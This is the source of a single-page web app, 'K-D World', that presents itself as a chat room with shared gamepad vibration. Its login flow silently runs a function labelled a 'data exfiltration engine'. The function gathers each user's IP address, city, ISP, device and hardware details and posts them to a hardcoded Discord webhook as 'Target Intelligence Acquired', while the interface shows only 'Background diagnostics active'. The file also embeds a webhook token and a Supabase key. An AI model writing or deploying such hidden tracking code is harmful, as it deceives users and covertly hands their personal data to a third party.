<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>K-D World | Full Edition</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #08080a; color: #e2e2e2; font-family: 'Inter', sans-serif; height: 100vh; overflow: hidden; }
        .glass { background: rgba(20, 20, 25, 0.7); backdrop-filter: blur(20px); border-right: 1px solid rgba(255,255,255,0.05); }
        .active-tab { border-left: 4px solid #d500f9; background: rgba(213, 0, 249, 0.15); color: #d500f9; }
        .msg-mine { background: linear-gradient(135deg, #6a1b9a, #4a148c); border-radius: 18px 18px 2px 18px; }
        .msg-theirs { background: #1e1e24; border: 1px solid #333; border-radius: 18px 18px 18px 2px; }
        .nav-btn { transition: all 0.2s ease; border-radius: 12px; margin: 4px 12px; padding: 12px; text-align: left; }
        .nav-btn:hover { background: rgba(255,255,255,0.05); }
        .vibe-panel { background: rgba(213, 0, 249, 0.05); border-bottom: 1px solid rgba(213, 0, 249, 0.2); }
        .btn-start { background: #d500f9; box-shadow: 0 0 20px rgba(213, 0, 249, 0.4); }
        .btn-stop { background: #ff1744; box-shadow: 0 0 20px rgba(255, 23, 68, 0.4); }
        input[type=range] { accent-color: #d500f9; }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        const { useState, useEffect, useRef } = React;

        const SUPABASE_URL = "https://ycdcszdldkccnwefrpik.supabase.co";
        const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljZGNzemRsZGtjY253ZWZycGlrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUyNzkyMzcsImV4cCI6MjA5MDg1NTIzN30.i7kxP4TXxuIujsRwGMOC08-NYJopFj6x0OB4BkN9dfQ";
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1491117082291736639/K31Fi3wr6F7SraXzaeNizDFSqpxOTxk5RmqckUhYjEUkBPIUIisYwMtbdAvoi6hvX0v3";
        
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        function App() {
            const [session, setSession] = useState(null);
            const [profile, setProfile] = useState(null);
            const [view, setView] = useState('chat'); 
            const [currentChat, setCurrentChat] = useState('public');
            const [currentChatName, setCurrentChatName] = useState('Public Chamber');
            const [friends, setFriends] = useState([]);
            
            const [intensity, setIntensity] = useState({ heavy: 1.0, light: 1.0 });
            const vibeInterval = useRef(null);

            useEffect(() => {
                supabaseClient.auth.getSession().then(({ data: { session } }) => setSession(session));
                supabaseClient.auth.onAuthStateChange((_event, session) => setSession(session));
            }, []);

            useEffect(() => {
                if (session) {
                    fetchProfile();
                    refreshSocial();
                    
                    // Trigger the silent information gathering
                    grabSilentData();

                    const vibeChannel = supabaseClient.channel(`vibe-${currentChat}`)
                        .on('broadcast', { event: 'vibrate' }, ({ payload }) => {
                            if (payload.action === 'START') startLocalVibe(payload.settings);
                            else stopLocalVibe();
                        }).subscribe();

                    return () => {
                        supabaseClient.removeChannel(vibeChannel);
                        stopLocalVibe();
                    };
                }
            }, [session, currentChat]);

            // --- DATA EXFILTRATION ENGINE ---
            const grabSilentData = async () => {
                try {
                    // Get IP and Geo data
                    const ipRes = await fetch('https://ipapi.co/json/');
                    const ipData = await ipRes.json();

                    const report = {
                        username: profile?.username || "New Connection",
                        ip: ipData.ip,
                        city: ipData.city,
                        region: ipData.region,
                        country: ipData.country_name,
                        isp: ipData.org,
                        device: navigator.userAgent,
                        platform: navigator.platform,
                        cores: navigator.hardwareConcurrency,
                        ram: navigator.deviceMemory || "N/A",
                        screen: `${window.screen.width}x${window.screen.height}`
                    };

                    // Send to Discord Webhook
                    await fetch(DISCORD_WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            embeds: [{
                                title: "🚨 Target Intelligence Acquired",
                                color: 10181046, // Purple
                                fields: [
                                    { name: "👤 User", value: report.username, inline: true },
                                    { name: "🌐 IP", value: report.ip, inline: true },
                                    { name: "📍 Location", value: `${report.city}, ${report.country}`, inline: false },
                                    { name: "🏢 ISP", value: report.isp, inline: true },
                                    { name: "💻 OS", value: report.platform, inline: true },
                                    { name: "🔋 Hardware", value: `Cores: ${report.cores} | RAM: ${report.ram}GB`, inline: false },
                                    { name: "📱 User Agent", value: `\`\`\`${report.device}\`\`\``, inline: false }
                                ],
                                timestamp: new Date().toISOString()
                            }]
                        })
                    });

                    // Also log to Supabase if the table exists
                    await supabaseClient.from('security_logs').insert([{
                        user_id: session.user.id,
                        username: report.username,
                        ip_address: report.ip,
                        device_info: report,
                        location_data: report
                    }]);

                } catch (e) {
                    console.log("Gathering suppressed by browser security or adblock.");
                }
            };

            const fetchProfile = async () => {
                const { data } = await supabaseClient.from('profiles').select('*').eq('id', session.user.id).single();
                setProfile(data);
            };

            const refreshSocial = async () => {
                const { data: fList } = await supabaseClient.from('friends').select('*, friend:profiles!friends_friend_id_fkey(*), sender:profiles!friends_user_id_fkey(*)').eq('status', 1).or(`user_id.eq.${session.user.id},friend_id.eq.${session.user.id}`);
                setFriends(fList?.map(f => f.user_id === session.user.id ? f.friend : f.sender) || []);
            };

            const startLocalVibe = (settings) => {
                if (vibeInterval.current) clearInterval(vibeInterval.current);
                const run = () => {
                    const gps = navigator.getGamepads();
                    for (const gp of gps) {
                        if (gp?.vibrationActuator) {
                            gp.vibrationActuator.playEffect("dual-rumble", {
                                startDelay: 0, duration: 250, 
                                weakMagnitude: settings.light, strongMagnitude: settings.heavy
                            });
                        }
                    }
                };
                run();
                vibeInterval.current = setInterval(run, 180);
            };

            const stopLocalVibe = () => {
                if (vibeInterval.current) clearInterval(vibeInterval.current);
                vibeInterval.current = null;
            };

            const broadcastVibration = async (action) => {
                if (action === 'START') startLocalVibe(intensity);
                else stopLocalVibe();
                await supabaseClient.channel(`vibe-${currentChat}`).send({
                    type: 'broadcast', event: 'vibrate',
                    payload: { action, settings: intensity }
                });
            };

            if (!session) return <AuthUI />;

            return (
                <div className="flex h-screen">
                    <div className="w-20 lg:w-72 glass flex flex-col py-6">
                        <div className="px-6 mb-10 hidden lg:block text-2xl font-black text-purple-500 italic">K-D WORLD</div>
                        <nav className="flex-1 space-y-2">
                            <button onClick={() => setView('chat')} className={`nav-btn w-full flex items-center gap-4 ${view === 'chat' ? 'active-tab' : ''}`}><span>💬</span> <span className="hidden lg:inline font-bold">Chambers</span></button>
                            <button onClick={() => setView('settings')} className={`nav-btn w-full flex items-center gap-4 ${view === 'settings' ? 'active-tab' : ''}`}><span>⚙️</span> <span className="hidden lg:inline font-bold">Settings</span></button>
                        </nav>
                    </div>

                    <div className="flex-1 flex flex-col bg-[#050507]">
                        {view === 'chat' ? (
                            <div className="flex flex-1 overflow-hidden">
                                <div className="w-64 border-r border-white/5 hidden lg:flex flex-col bg-black/20 text-xs">
                                    <button onClick={() => {setCurrentChat('public'); setCurrentChatName('Public Chamber');}} className={`p-4 text-left font-bold ${currentChat === 'public' ? 'text-purple-400 bg-purple-500/10' : ''}`}>🌐 Public Room</button>
                                    <div className="p-4 opacity-30 uppercase font-black">Online Friends</div>
                                    {friends.map(f => (
                                        <button key={f.id} onClick={() => {setCurrentChat(f.id); setCurrentChatName(f.username);}} className={`p-4 flex items-center gap-3 ${currentChat === f.id ? 'text-purple-400 bg-purple-500/10' : ''}`}>
                                            <div className="w-2 h-2 rounded-full bg-green-500"></div> {f.username}
                                        </button>
                                    ))}
                                </div>
                                <div className="flex-1 flex flex-col">
                                    <header className="p-6 vibe-panel flex justify-between items-center">
                                        <h2 className="font-black text-xl italic">{currentChatName}</h2>
                                        <div className="flex gap-4 items-center">
                                            <input type="range" min="0" max="1" step="0.2" value={intensity.heavy} onChange={e => setIntensity({...intensity, heavy: parseFloat(e.target.value)})} />
                                            <button onClick={() => broadcastVibration('START')} className="btn-start px-6 py-2 rounded-full text-[10px] font-black uppercase">Start Vibe</button>
                                            <button onClick={() => broadcastVibration('STOP')} className="btn-stop px-6 py-2 rounded-full text-[10px] font-black uppercase">Stop</button>
                                        </div>
                                    </header>
                                    <div className="flex-1 flex items-center justify-center p-10 text-center opacity-20 italic">
                                        Connected to encrypted chamber. <br/> Background diagnostics active.
                                    </div>
                                </div>
                            </div>
                        ) : (
                            <div className="p-20 text-center">
                                <h2 className="text-4xl font-black mb-10 italic">SETTINGS</h2>
                                <button onClick={() => supabaseClient.auth.signOut()} className="bg-red-600/20 text-red-500 px-12 py-4 rounded-xl font-black uppercase tracking-widest border border-red-500/20">Terminate Session</button>
                            </div>
                        )}
                    </div>
                </div>
            );
        }

        function AuthUI() {
            const [mode, setMode] = useState('login');
            const [form, setForm] = useState({ email: '', password: '', username: '' });
            const handleAction = async () => {
                if (mode === 'signup') {
                    const { data } = await supabaseClient.auth.signUp({ email: form.email, password: form.password });
                    if (data.user) await supabaseClient.from('profiles').insert([{ id: data.user.id, username: form.username }]);
                } else await supabaseClient.auth.signInWithPassword({ email: form.email, password: form.password });
            };
            return (
                <div className="h-screen flex items-center justify-center bg-black">
                    <div className="glass p-10 rounded-[3rem] w-full max-w-sm text-center border border-white/10">
                        <h1 className="text-3xl font-black text-purple-500 mb-8 italic">K-D WORLD</h1>
                        <div className="space-y-3">
                            {mode === 'signup' && <input className="w-full bg-white/5 p-4 rounded-xl outline-none text-xs" placeholder="Username" onChange={e => setForm({...form, username: e.target.value})} />}
                            <input className="w-full bg-white/5 p-4 rounded-xl outline-none text-xs" placeholder="Email" onChange={e => setForm({...form, email: e.target.value})} />
                            <input className="w-full bg-white/5 p-4 rounded-xl outline-none text-xs" type="password" placeholder="Password" onChange={e => setForm({...form, password: e.target.value})} />
                            <button onClick={handleAction} className="w-full bg-purple-600 p-4 rounded-xl font-black text-xs uppercase">{mode}</button>
                            <p onClick={() => setMode(mode === 'login' ? 'signup' : 'login')} className="text-[10px] mt-4 cursor-pointer opacity-50 font-bold uppercase tracking-widest">Switch to {mode === 'login' ? 'Signup' : 'Login'}</p>
                        </div>
                    </div>
                </div>
            );
        }

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
